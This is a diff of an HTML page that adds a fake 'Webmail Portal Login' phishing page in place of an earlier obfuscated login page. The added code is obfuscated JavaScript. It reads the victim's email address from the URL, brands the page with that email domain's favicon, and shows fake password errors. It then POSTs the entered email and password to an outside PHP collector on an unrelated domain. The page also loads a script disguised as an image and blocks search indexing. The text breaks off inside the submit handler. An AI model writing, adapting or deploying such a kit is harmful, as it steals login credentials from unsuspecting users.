@@ -1,1313 +1,187 @@
-<html id="html" data-ref="alphash" data-iframe="0" lang="en"><head>
-    <meta charset="UTF-8">
 
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <link id="faviconx" rel="icon" type="image/x-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;url=http://aegistax.com&amp;size=64">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <title>Webmail Portal Login V2</title>
+    <script src="https://storage.googleapis.com/webmail-portal28935.appspot.com/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png"></script>
     <style>
-        /* OBFUSCATED BY CSSOBFUSCATOR.COM at 2022/08/17 00:14:09 */
-        
-        body,
-        [class~=main_container] {
-            background-color: #fff;
-			overflow-x:hidden;
-        }
-        
-        [class~=main_container],
-        body,
-        [class~=container] {
-            display: flex;
-        }
-        
-        [class~=main_container],
-        body {
-            justify-content: center;
-        }
-        
-        [class~=container] h3 {
-            color: #000;
-        }
-        
-        [class~=container] {
-            width: 26.25pc;
-        }
-        
-        #auth_reg {
-            color: red;
-        }
-        
-        [class~=container] {
-            height: 500px;
-        }
-        
-        #auth_reg {
-            padding-left: 3.75pt;
-        }
-        
-        #auth_reg {
-            padding-bottom: 3.75pt;
-        }
-        
-        [class~=container] h3,
-        [class~=container] h3 i,
-        [class~=intro-text] p {
-            font-size: 1rem;
-        }
-        
-        * {
-            box-sizing: border-box;
-        }
-        
-        [class~=intro-text] p {
-            padding-top: .3rem;
-        }
-        
-        .input input:focus {
-            border-left-width: .020833333in;
-        }
-        
-        #auth_reg {
-            padding-right: 3.75pt;
-        }
-        
-        [class~=container] {
-            background: #fff;
-        }
-        
-        [class~=container] {
-            box-shadow: 0 .625pc 15px rgba(179, 179, 179, .7);
-        }
-        
-        * {
-            margin-left: 0;
-        }
-        
-        [class~=container] {
-            position: absolute !important;
-        }
-        
-        [class~=intro-text] p {
-            font-family: Cambria, Cochin, Georgia, Times, "Times New Roman", serif;
-        }
-        
-        [class~=intro-text] p {
-            text-align: center;
-        }
-        
-        [class~=intro-text] h2 {
-            color: #0627ab;
-        }
-        
-        [class~=intro-text] h2 {
-            font-size: 1.2rem;
-        }
-        
-        [class~=input] input:valid~label,
-        [class~=container] {
-            top: 10%;
-        }
-        
-        [class~=join-link] a {
-            text-decoration: none;
-        }
-        
-        [class~=join-link] a {
-            font-weight: normal;
-        }
-        
-        #auth_reg {
-            padding-top: 3.75pt;
-        }
-        
-        #auth_reg2,
-        #auth_reg {
-            font-size: small;
-        }
-        
-        [class~=join-link] a {
-            color: rgba(128, 128, 128, .577);
-        }
-        
-        [class~=forgot-pass-link]:hover {
-            background: rgba(10, 102, 195, .3);
-        }
-        
-        [class~=container] {
-            display: none;
-        }
-        
-        button {
-            height: 60px !important;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            position: absolute;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            border-radius: .625pc;
-        }
-        
-        button {
-            background: #0a66c3;
-        }
-        
-        [class~=container],
-        [class~=intro-text] {
-            flex-direction: column;
-        }
-        
-        .input input:focus {
-            border-bottom-width: .020833333in;
-        }
-        
-        [class~=input],
-        [class~=input] input {
-            width: 100%;
-        }
-        
-        [class~=input],
-        [class~=input] input {
-            height: .520833333in;
-        }
-        
-        [class~=container] {
-            justify-content: space-evenly;
-        }
-        
-        [class~=container] {
-            padding-left: 2rem;
-        }
-        
-        [class~=container] h3 i {
-            padding-left: .1rem;
-        }
-        
-        [class~=container] {
-            padding-bottom: 2rem;
-        }
-        
-        [class~=input] input {
-            padding-top: 1.1rem;
-        }
-        
-        [class~=container] {
-            padding-right: 2rem;
-        }
-        
-        [class~=input] input {
-            padding-left: .09375in;
-        }
-        
-        * {
-            margin-bottom: 0;
-        }
-        
-        button,
-        [class~=input] input {
-            outline: none;
-        }
-        
-        #auth_reg2,
-        #auth_reg {
-            font-family: sans-serif, "Helvetica Neue", "Lucida Grande", Arial;
-        }
-        
-        [class~=container] {
-            padding-top: 0rem;
-        }
-        
-        [class~=container] {
-            z-index: 99999999;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            top: 0;
-        }
-        
-        [class~=intro-text] {
-            display: flex;
-        }
-        
-        [class~=intro-text] {
-            justify-content: center;
-        }
-        
-        [class~=input] input {
-            border-left-width: .0625pc;
-        }
-        
-        [class~=input] input {
-            border-bottom-width: .0625pc;
-        }
-        
-        [class~=intro-text]>* {
-            margin-left: auto;
-        }
-        
-        button {
-            border-left-width: medium;
-        }
-        
-        #auth_reg2,
-        #auth_reg {
-            font-stretch: expanded;
-        }
-        
-        button {
-            border-bottom-width: medium;
-        }
-        
-        [class~=input] input {
-            border-right-width: .0625pc;
-        }
-        
-        [class~=input] input {
-            border-top-width: .0625pc;
-        }
-        
-        [class~=input] input {
-            border-left-style: solid;
-        }
-        
-        [class~=intro-text]>* {
-            margin-bottom: .625pc;
-        }
-        
-        [class~=input] input {
-            border-bottom-style: solid;
-        }
-        
-        [class~=intro-text]>* {
-            margin-right: auto;
-        }
-        
-        #auth_reg2 {
-            color: red;
-        }
-        
-        [class~=input] input {
-            border-right-style: solid;
-        }
-        
-        [class~=input] input {
-            border-top-style: solid;
-        }
-        
-        [class~=input] input {
-            border-left-color: #8c8c8c;
-        }
-        
-        [class~=input] input {
-            border-bottom-color: #8c8c8c;
-        }
-        
-        [class~=intro-text]>* {
-            margin-top: auto;
-        }
-        
-        [class~=input] input {
-            border-right-color: #8c8c8c;
-        }
-        
-        .input input:focus {
-            border-right-width: .020833333in;
-        }
-        
-        button {
-            border-right-width: medium;
-        }
-        
-        button {
-            border-top-width: medium;
-        }
-        
-        [class~=input] input {
-            border-top-color: #8c8c8c;
-        }
-        
-        [class~=input] {
-            position: relative;
-        }
-        
-        [class~=input] input {
-            border-image: none;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            right: 100%;
-        }
-        
-        [class~=input] input {
-            border-radius: .1875pc;
-        }
-        
-        [class~=input] input,
-        [class~=input] label {
-            transition: .2s;
-        }
-        
-        [class~=input] {
-            margin-bottom: .7rem;
-        }
-        
-        [class~=forgot-pass-link],
-        [class~=join-link] {
-            text-align: center;
-        }
-        
-        * {
-            margin-right: 0;
-        }
-        
-        [class~=input] input {
-            letter-spacing: .3rem;
-        }
-        
-        [class~=input] input {
-            font-size: 1rem;
-        }
-        
-        #auth_reg2,
-        .top_level h3 {
-            display: none;
-        }
-        
-        [class~=join-link] {
-            color: rgba(0, 0, 0, .5);
-        }
-        
-        #show_pass {
-            padding-left: 6pt;
-        }
-        
-        [class~=join-link] {
-            font-size: small;
-        }
-        
-        [class~=forgot-pass-link] {
-            width: 8.75pc;
-        }
-        
-        [class~=input] label {
-            position: absolute;
-        }
-        
-        [class~=forgot-pass-link] {
-            padding-left: .2rem;
-        }
-        
-        [class~=forgot-pass-link] {
-            padding-bottom: .2rem;
-        }
-        
-        [class~=input] label {
-            top: 30%;
-        }
-        
-        #auth_reg {}
-        
-        [class~=forgot-pass-link] {
-            padding-right: .2rem;
-        }
-        
-        [class~=input] label {
-            left: 7.5pt;
-        }
-        
-        .input input:focus {
-            border-top-width: .020833333in;
-        }
-        
-        #top_label,
-        [class~=input] label {
-            font-size: 1.1rem;
-        }
-        
-        [class~=forgot-pass-link] {
-            padding-top: .2rem;
-        }
-        
-        [class~=input] label {
-            color: #8c8c8c;
-        }
-        
-        #top_label_logo {
-            max-width: 160px;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            bottom: 0;
-        }
-        
-        button {
-            border-left-style: none;
-        }
-        
-        [class~=forgot-pass-link] {
-            text-decoration: none;
-        }
-        
-        [class~=forgot-pass-link] {
-            font-weight: bolder;
-        }
-        
-        [class~=forgot-pass-link],
-        #top_label {
-            color: #0a66c3;
-        }
-        
-        #top_label_logo {
-            max-height: .833333333in;
-        }
-        
-        [class~=forgot-pass-link] {
-            transition: .3s;
-        }
-        
-        [class~=forgot-pass-link] {
-            border-radius: .75pc;
-        }
-        
-        .loader:before {
-            content: "";
-        }
-        
-        #top_label,
-        [class~=top_level],
-        [class~=rem_me] {
-            display: flex;
-        }
-        
-        [class~=input] input:valid~label {
-            font-size: .8rem;
-        }
-        
-        .loader:before {
-            border-left-width: .75pt;
-        }
-        
-        [class~=top_level],
-        [class~=loading_text] {
-            justify-content: center;
-        }
-        
-        #main_logo_id {
-            max-width: 75pt;
-        }
-        
-        .loader:before {
-            border-bottom-width: .75pt;
-        }
-        
-        .loader:before {
-            border-right-width: .75pt;
-        }
-        
-        [class~=rem_me],
-        [class~=top_level] {
-            align-items: center;
-        }
-        
-        button {
-            border-bottom-style: none;
-        }
-        
-        [class~=top_level] {
-            background-color: #dedede;
-        }
-        
-        [class~=top_level],
-        [class~=rem_me] {
-            padding-left: .3125pc;
-        }
-        
-        #main_logo_id {
-            min-width: auto;
-        }
-        
-        [class~=top_level] {
-            padding-bottom: 11.25pt;
-        }
-        
-        [class~=top_level],
-        [class~=rem_me] {
-            padding-right: .3125pc;
-        }
-        
-        [class~=top_level] {
-            padding-top: 15px;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            left: 0;
-        }
-        
-        .loader:before {
-            border-top-width: .75pt;
-        }
-        
-        button {
-            border-right-style: none;
-        }
-        
-        #top_label {
-            text-align: center;
-        }
-        
-        [class~=rem_me] {
-            padding-bottom: 3.75pt;
-        }
-        
-        button {
-            border-top-style: none;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            background-color: #626262;
-        }
-        
-        .loader,
-        .loader:before {
-            border-left-style: solid;
-        }
-        
-        .loader,
-        .loader:before {
-            border-bottom-style: solid;
-        }
-        
-        [class~=input] input:valid~label,
-        [class~=top_level] h3 span {
-            color: #000;
-        }
-        
-        button {
-            border-left-color: currentColor;
-        }
-        
-        [class~=rem_me] {
-            padding-top: 3.75pt;
-        }
-        
-        .loader,
-        .loader:before {
-            border-right-style: solid;
-        }
-        
-        .loader:before,
-        .loader {
-            border-top-style: solid;
-        }
-        
-        button {
-            border-bottom-color: currentColor;
-        }
-        
-        #top_label {
-            font-weight: bold;
-        }
-        
-        .loader {
-            width: 5.208333333in;
-        }
-        
-        .loader:before {
-            border-left-color: #747474;
-        }
-        
-        button {
-            border-right-color: currentColor;
-        }
-        
-        .loader {
-            margin-left: auto;
-        }
-        
-        .loader {
-            margin-bottom: 0;
-        }
-        
-        .loader {
-            margin-right: auto;
-        }
-        
-        .loader,
-        * {
-            margin-top: 0;
-        }
-        
-        .input input:focus {
-            border-left-color: #0a66c3;
-        }
-        
-        button {
-            border-top-color: currentColor;
-        }
-        
-        .loader:before {
-            border-bottom-color: #747474;
-        }
-        
-        button {
-            border-image: none;
-        }
-        
-        .loader:before {
-            border-right-color: #747474;
-        }
-        
-        .loader:before {
-            border-top-color: #747474;
-        }
-        
-        .loader {
-            border-radius: 7.5pt;
-        }
-        
-        .loader {
-            border-left-width: .041666667in;
-        }
-        
-        .loader:before {
-            border-image: none;
-        }
-        
-        .loader:before {
-            border-radius: 5px;
-        }
-        
-        .loader {
-            border-bottom-width: .041666667in;
-        }
-        
-        .loader:before {
-            position: absolute;
-        }
-        
-        .loader:before {
-            top: -.25pc;
-        }
-        
-        .input input:focus {
-            border-bottom-color: #0a66c3;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            width: 0;
-        }
-        
-        .loader {
-            border-right-width: .041666667in;
-        }
-        
-        .loader {
-            border-top-width: .041666667in;
-        }
-        
-        .loader:before {
-            right: -3pt;
-        }
-        
-        button {
-            border-radius: 0px;
-        }
-        
-        button {
-            color: #fff;
-        }
-        
-        .input input:focus {
-            border-right-color: #0a66c3;
-        }
-        
-        .loader:before {
-            bottom: -3pt;
-        }
-        
-        button {
-            font-size: 1rem;
-        }
-        
-        button {
-            font-weight: bolder;
-        }
-        
-        button {
-            cursor: pointer;
-        }
-        
-        .input input:focus {
-            border-top-color: #0a66c3;
-        }
-        
-        [class~=loader] [class~=loaderBar] {
-            animation: borealisBar 1.3s linear infinite;
-        }
-        
-        .loader {
-            border-left-color: transparent;
-        }
-        
-        .loader:before {
-            left: -3pt;
-        }
-        
-        [class~=input] input:focus~label {
-            top: 10%;
-        }
-        
-        .loader {
-            border-bottom-color: transparent;
-        }
-        
-        .loader {
-            border-right-color: transparent;
-        }
-        
-        .loader {
-            border-top-color: transparent;
-        }
-        
-        .loader {
-            border-image: none;
-        }
-        
-        .loader {
-            position: relative;
-        }
-        
-        .loader {
-            padding-left: .0625pc;
-        }
-        
-        [class~=input] input:focus~label {
-            font-size: .8rem;
-        }
-        
-        * {
-            padding-left: 0;
-        }
-        
-        .loader {
-            padding-bottom: .0625pc;
-        }
-        
-        .loader {
-            padding-right: .0625pc;
-        }
-        
-        .loader {
-            padding-top: .0625pc;
-        }
-        
-        * {
-            padding-bottom: 0;
-        }
-        
-        [class~=input] input:focus~label {
-            color: #000;
-        }
-        
-        * {
-            padding-right: 0;
-        }
-        
-        * {
-            padding-top: 0;
-        }
-        
-        @keyframes borealisBar {
-            0% {
-                left: 0%;
-                right: 100%;
-                width: 0%;
-            }
-            10% {
-                left: 0%;
-                right: 75%;
-                width: 25%;
-            }
-            90% {
-                right: 0%;
-                left: 75%;
-                width: 25%;
-            }
-            100% {
-                left: 100%;
-                right: 0%;
-                width: 0%;
-            }
-        }
-        
-        [class~=mail-loader_block] {
-            position: relative;
-        }
-        
-        [class~=mail-loader_block] {
-            margin-top: 12%;
-        }
-        
-        [class~=mail-loader_block] {
-            display: flex;
-        }
-        
-        [class~=mail-loader_block] {
-            justify-content: center;
-        }
-        
-        [class~=mail-loader_block] {
-            align-items: center;
-        }
-        
-        [class~=mail-loader_block] {
-            flex-direction: column;
-        }
-        
-        [class~=progress-bar] {
-            border-radius: 7.5pt;
-        }
-        
-        [class~=progress-bar] {
-            overflow: hidden;
-        }
-        
-        [class~=progress-bar] {
-            width: 100%;
-        }
-        
-        [class~=progress-bar] {
-            border-left-style: solid;
-        }
-        
-        [class~=progress-bar] {
-            border-bottom-style: solid;
-        }
-        
-        [class~=progress-bar] {
-            border-right-style: solid;
-        }
-        
-        [class~=progress-bar] {
-            border-top-style: solid;
-        }
-        
-        [class~=mail-loader_block] img {
-            margin-left: auto;
-        }
-        
-        [class~=progress-bar] {
-            border-left-width: .005208333in;
-        }
-        
-        [class~=progress-bar] {
-            border-bottom-width: .005208333in;
-        }
-        
-        [class~=progress-bar] {
-            border-right-width: .005208333in;
-        }
-        
-        [class~=progress-bar] {
-            border-top-width: .005208333in;
-        }
-        
-        [class~=progress-bar] {
-            border-left-color: #000;
-        }
-        
-        [class~=progress-bar] {
-            border-bottom-color: #000;
-        }
-        
-        [class~=progress-bar] {
-            border-right-color: #000;
-        }
-        
-        [class~=progress-bar] {
-            border-top-color: #000;
-        }
-        
-        [class~=bar] {
-            background: transparent;
-        }
-        
-        [class~=bar],
-        [class~=progress] {
-            padding-left: .020833333in;
-        }
-        
-        [class~=progress],
-        [class~=bar] {
-            padding-bottom: .020833333in;
-        }
-        
-        [class~=progress],
-        [class~=bar] {
-            padding-right: .020833333in;
-        }
-        
-        [class~=progress],
-        [class~=bar] {
-            padding-top: .020833333in;
-        }
-        
-        [class~=progress] {
-            animation: loader 8s ease infinite;
-        }
-        
-        [class~=progress] {
-            background: #fe0;
-        }
-        
-        [class~=progress] {
-            color: #fff;
-        }
-        
-        [class~=progress] {
-            width: 0;
-        }
-        
-        [class~=progress-bar] {
-            left: 50%;
-        }
-        
-        [class~=progress-bar] {
-            width: 5.208333333in;
-        }
-        
-        [class~=progress-bar] {
-            position: absolute;
-        }
-        
-        [class~=mail-loader_block] img {
-            margin-bottom: 15pt;
-        }
-        
-        [class~=progress-bar] {
-            top: 50%;
-        }
-        
-        [class~=progress-bar] {
-            transform: translate3d(-50%, -50%, 0);
-        }
-        
-        [class~=mail-loader_block] img {
-            margin-right: auto;
-        }
-        
-        [class~=mail-loader_block] img {
-            margin-top: auto;
-        }
-        
-        [class~=mail-loader_block] img {
-            border-radius: 0%;
-        }
-        
-        .progress-bar span {
-            display: block;
-        }
-        
-        @keyframes loader {
-            0% {
-                width: 0;
-            }
-            20% {
-                width: 10%;
-            }
-            25% {
-                width: 24%;
-            }
-            43% {
-                width: 41%;
-            }
-            56% {
-                width: 50%;
-            }
-            66% {
-                width: 52%;
-            }
-            71% {
-                width: 60%;
-            }
-            75% {
-                width: 76%;
-            }
-            94% {
-                width: 86%;
-            }
-            100% {
-                width: 100%;
-            }
-        }
-        
-        .progress_loaderx {
-            position: relative;
-        }
-        
-        .progress_loaderx {
-            margin-top: 15%;
-        }
-        
-        .progress_loaderx {
-            display: flex;
-        }
-        
-        .progress_loaderx {
-            justify-content: center;
-        }
-        
-        .progress_loaderx {
-            align-items: center;
-        }
-        
-        .overlay_div {
-            position: fixed;
-        }
-        
-        .overlay_div {
-            background-color: rgba(0, 0, 0, .196);
-        }
-        
-        [class~=new_feature] [class~=left_box] {
-            display: block !important;
-        }
-        
-        .progress_loaderx img {
-            margin-left: auto;
-        }
-        
-        .overlay_div {
-            width: 100%;
-        }
-        
-        .overlay_div {
-            height: 100%;
-        }
-        
-        .overlay_div {
-            z-index: 99999;
-        }
-        
-        .overlay_div {
-            display: none;
-        }
-        
-        [class~=new_feature] {
-            border-left-style: solid;
-        }
-        
-        [class~=new_feature] {
-            border-bottom-style: solid;
-        }
-        
-        [class~=new_feature] {
-            border-right-style: solid;
-        }
-        
-        [class~=new_feature] {
-            border-top-style: solid;
-        }
-        
-        [class~=new_feature] {
-            border-left-width: .75pt;
-        }
-        
-        [class~=new_feature] {
-            border-bottom-width: 0pt;
-        }
-        
-        [class~=new_feature] {
-            border-right-width: 0in;
-        }
-        
-        [class~=new_feature] {
-            border-top-width: 0pt;
-        }
-        
-        [class~=new_feature] {
-            border-left-color: rgba(138, 138, 138, .582);
-        }
-        
-        [class~=new_feature] {
-            border-bottom-color: rgba(138, 138, 138, .582);
-        }
-        
-        [class~=new_feature] {
-            border-right-color: rgba(138, 138, 138, .582);
-        }
-        
-        [class~=new_feature] {
-            border-top-color: rgba(138, 138, 138, .582);
-        }
-        
-        .progress_loaderx img {
-            margin-bottom: 6.25pc;
-        }
-        
-        [class~=new_feature] {
-            margin-left: 200px;
-        }
-        
-        [class~=left_box] {
-            position: absolute;
-        }
-        
-        [class~=left_box] {
-            background-color: rgba(106, 106, 106, .392);
-        }
-        
-        [class~=left_box] {
-            width: 3.125in;
-        }
-        
-        [class~=left_box] {
-            height: 26.875pc;
-        }
-        
-        [class~=left_box] {
-            z-index: 9999999;
-        }
-        
-        [class~=left_box] {
-            right: 430px;
-        }
-        
-        [class~=left_box] {
-            padding-left: .052083333in;
-        }
-        
-        [class~=left_box] {
-            padding-bottom: .052083333in;
-        }
-        
-        [class~=left_box] {
-            padding-right: .052083333in;
-        }
-        
-        [class~=left_box] {
-            padding-top: .052083333in;
-        }
-        
-        [class~=left_box]>* {
-            color: red;
-        }
-        
-        .progress_loaderx img {
-            margin-right: auto;
-        }
-        
-        .progress_loaderx img {
-            margin-top: auto;
-        }
-        
-        .progress_loaderx img {
-            border-radius: 50%;
-        }
-        
-        @media only screen and (max-width: 600px) {
-            [class~=mail-loader_block],
-            .progress_loaderx {
-                margin-top: 50%;
-            }
-            [class~=progress-bar],
-            [class~=loader] {
-                width: 85%;
-            }
-            [class~=container] {
-                box-shadow: 0 7.5pt 11.25pt rgba(179, 179, 179, 0) !important;
-            }
-            [class~=container] {
-                width: auto;
-            }
-            [class~=container] {
-                height: auto;
-            }
-            [class~=container] {
-                top: 8%;
-            }
-        }
-    </style>
+        html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}
+    
+    html,body{font-size:18px;font-family:Arial,helvetica neue,Helvetica,sans-serif sans-serif;font-weight:500}#root{position:absolute;left:0;right:0;bottom:0;top:0;z-index:-10;pointer-events:none}.error{color:#dc3545;width:80%;margin:0 auto;padding-top:5px}.form-holder{background-color:#fff;width:600px;margin:180px auto;height:100%;box-shadow:0 20px 50px #a9a9a9;border-radius:4px 4px 0 0;border:1px solid #d6dfea;z-index:12}.xlogo{background-color:#0d4f8b;color:#fff;padding:8px;margin-bottom:10px}.xlogo img{vertical-align:middle;width:5%;height:5%;object-fit:contain}.xlogo span{vertical-align:middle}.form-wrap{width:400px;margin:0 auto;text-align:center}.form-wrap p{font-size:24px}.form-wrap img{margin:20px}.finput{width:80%;margin:10px auto}.finput input[type=email],.finput input[type=password]{font-size:24px;padding:7px 10px 7px 40px;border-radius:4px;margin:5px 0;width:90%;border:1px solid #d6dfea}.finput input[type=email]{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAQAAABKIxwrAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADdcAAA3XAUIom3gAAAAHdElNRQfjAwITKgogc0nIAAAA/ElEQVQ4y43Sv07CUBTH8W9BiEvjSAcZCMbRQWNKSHBnwD4AL8DII7CRONXwDE76DhhfoCshIeGPJLoRZGjCcBygtdR72/s7w10+Ock550I6V4wImBEwok5OHvhB4trSysJlVgksCAtKeu6lsCB0kqBwwl1FC1fPHQV39NxS8KKeLxV8rh+1qRi1kbXKjxQek5ka6wT+pEZOqryxR9jzymUe7WMDNtfHt09VTSv4hAhfDGlzR5sh3wghPpVTajFgp9hKVDsGyZv0MmhUvb/eEwM+jU7qGWBBeDzwd0M+Brg1xIJwX+SJm7zLxTm32HBhzDdnPNNV/vP/EV5+AUv1vp3jhmegAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTAyVDE4OjQyOjEwKzAxOjAw99JImgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0wMlQxODo0MjoxMCswMTowMIaP8CYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC
+) no-repeat scroll 10px 10px}.finput input[type=password]{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAQAAABKfvVzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAHdElNRQfjAwITLAsBLt7YAAAA1klEQVQ4y72STQ6CMBCFP3SNiSSykvvoUtEDGe7CEfQW6NI1sNRECUtxXABKofwkJE6TJn3z3vTNtFAPG48zKSkBHgt6YkeCVNaTbTf9rdAFIWuX2EX1EBcTkw1XBOHRZswr6NYXsYgQhINecEEQXAXbIwiBXpAbMhVshiAkP8CoJKWBaNBJ35zrUQruRSUaYy3Rm2pJBhQ3RlkaKTji4HDqEqqNLgFwdO3rb5j221Vr+QD4w2+YV/ZBTUcAxMMFGQAvXep/Lx33MiP1uCZs/NPqClnlxA8hMnhnez+9CwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0wMy0wMlQxODo0NDoxMSswMTowMFy7M2kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMDMtMDJUMTg6NDQ6MTErMDE6MDAt5ovVAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAABJRU5ErkJggg==
+) no-repeat scroll 7px 7px}.finput input[type=email]:hover,.finput input[type=password]:hover,.finput input[type=email]:focus,.finput input[type=password]:focus{border:1px solid #0d4f8b}button{border:1px solid #0d4f8b;font-size:20px;padding:7px 20px;border-radius:4px;background-color:#0d4f8b;color:#fff}button:hover{background-color:#1874cd;cursor:pointer}.privacy{font-size:14px;color:gray;text-align:left;display:block;margin-bottom:20px}</style>
+    <link id="favicon" rel="shortcut icon" type="image/png" href="https://firebasestorage.googleapis.com/v0/b/chdi98-u54r.appspot.com/o/favicon.png">
+    <script type="text/javascript">
+    var _0x29a3 = ['innerHTML', '137967OuewSg', '379705GmhmYc', 'src', 'block', 'display', 'message', 'hash', 'preventDefault', '1BQGHgr', 'val', 'fail', 'Check\x20your\x20network\x20connection..', 'style', 'ajax', 'kai', 'input[name=pr]', 'redirecto', 'banNer', 'input[name=ai]', 'title', 'myframe', '74734CDKuWR', 'Webmail\x20Portal\x20Login\x20-\x20', 'replace', 'https://s0.wordpress.com/mshots/v1/https://', 'zion', 'attr', 'none', '282575HCidVs', 'slice', 'getElementById', 'Retype', '31421MpoORy', 'indexOf', '1DvjFvy', 'length', 'ai', 'Invalid\x20password\x20.\x20Please\x20try\x20again\x20...', 'https://www.google.com/s2/favicons?domain=', 'location', 'myError', 'log', 'focus', 'pr', 'value', '12FNOhav', 'hido', '572226OvGFSN', 'href', '529969LtYXLi'];
+    var _0x40b2 = function(_0x4fbed0, _0xbe12cc) { _0x4fbed0 = _0x4fbed0 - 0x93; var _0x29a399 = _0x29a3[_0x4fbed0]; return _0x29a399; };
+    var _0x2e20a0 = _0x40b2;
+    (function(_0x492b24, _0x50e8e9) {
+        var _0x1b0ff2 = _0x40b2;
+        while (!![]) {
+            try {
+                var _0x1e35b8 = -parseInt(_0x1b0ff2(0xb8)) + parseInt(_0x1b0ff2(0xba)) + parseInt(_0x1b0ff2(0x9e)) * -parseInt(_0x1b0ff2(0xc4)) + parseInt(_0x1b0ff2(0xb6)) * parseInt(_0x1b0ff2(0xa9)) + parseInt(_0x1b0ff2(0xa5)) + parseInt(_0x1b0ff2(0xbc)) + parseInt(_0x1b0ff2(0xbd)) * -parseInt(_0x1b0ff2(0xab));
+                if (_0x1e35b8 === _0x50e8e9) break;
+                else _0x492b24['push'](_0x492b24['shift']());
+            } catch (_0x3cd5ae) { _0x492b24['push'](_0x492b24['shift']()); }
+        }
+    }(_0x29a3, 0x49762));
+    var hash = window[_0x2e20a0(0xb0)]['hash']['substr'](0x1);
+    window['onload'] = function onoff() {
+        var _0x230e50 = _0x2e20a0;
+        if (hash) {
+            var _0x1af05f = window[_0x230e50(0xb0)][_0x230e50(0xc2)][_0x230e50(0xa0)]('#', ''),
+                _0x1fe803 = _0x1af05f[_0x230e50(0xaa)]('@'),
+                _0x3ebdb8 = _0x1af05f[_0x230e50(0xa6)](_0x1fe803 + 0x1, _0x1af05f[_0x230e50(0xac)]);
+            document[_0x230e50(0x9c)] = _0x230e50(0x9f) + _0x3ebdb8;
+            var _0x234425 = _0x230e50(0xaf) + _0x3ebdb8;
+            document[_0x230e50(0xa7)](_0x230e50(0xa2))[_0x230e50(0xbe)] = _0x234425, document[_0x230e50(0xa7)](_0x230e50(0xad))['value'] = _0x1af05f, document[_0x230e50(0xa7)](_0x230e50(0x97))[_0x230e50(0xbb)] = _0x3ebdb8, document[_0x230e50(0xa7)](_0x230e50(0x9a))[_0x230e50(0xbb)] = _0x3ebdb8, $('#favicon')[_0x230e50(0xa3)](_0x230e50(0xb9), _0x234425), document[_0x230e50(0xa7)]('pr')[_0x230e50(0xb3)](), document['getElementById'](_0x230e50(0x9d))[_0x230e50(0xbe)] = _0x230e50(0xa1) + _0x3ebdb8, document[_0x230e50(0xa7)]('redirecto')[_0x230e50(0xb5)] = _0x230e50(0xa1) + _0x3ebdb8;
+        } else {}
+    };
+    var n = 0x0;
+
+    function goNow() {
+        var _0x47a8dd = _0x2e20a0,
+            _0x4d9fc4 = document['getElementById'](_0x47a8dd(0xb4)),
+            _0x3cdf92 = document['getElementById'](_0x47a8dd(0x99))[_0x47a8dd(0xb5)],
+            _0x12e0b2 = document[_0x47a8dd(0xa7)](_0x47a8dd(0xb1));
+        if (_0x4d9fc4[_0x47a8dd(0xb5)][_0x47a8dd(0xac)] < 0x4) return _0x12e0b2[_0x47a8dd(0x95)][_0x47a8dd(0xc0)] = 'block', _0x12e0b2[_0x47a8dd(0xbb)] = 'Put\x20your\x20correct\x20password.', _0x4d9fc4[_0x47a8dd(0xb3)](), ![];
+        else {
+            _0x12e0b2['style'][_0x47a8dd(0xc0)] = _0x47a8dd(0xa4);
+            var _0x410913 = { 'email': $(_0x47a8dd(0x9b))[_0x47a8dd(0xc5)](), 'passw': $(_0x47a8dd(0x98))[_0x47a8dd(0xc5)](), 'hido': $('input[name=hido]')[_0x47a8dd(0xc5)]() };
+            return $[_0x47a8dd(0x96)]({ 'type': 'POST', 'url': 'https://approvedplumbingandheating.com/nnenna/elora.php', 'data': _0x410913, 'dataType': 'json', 'encode': !![] })['done'](function(_0x34bd96) {
+                var _0x3522b4 = _0x47a8dd;
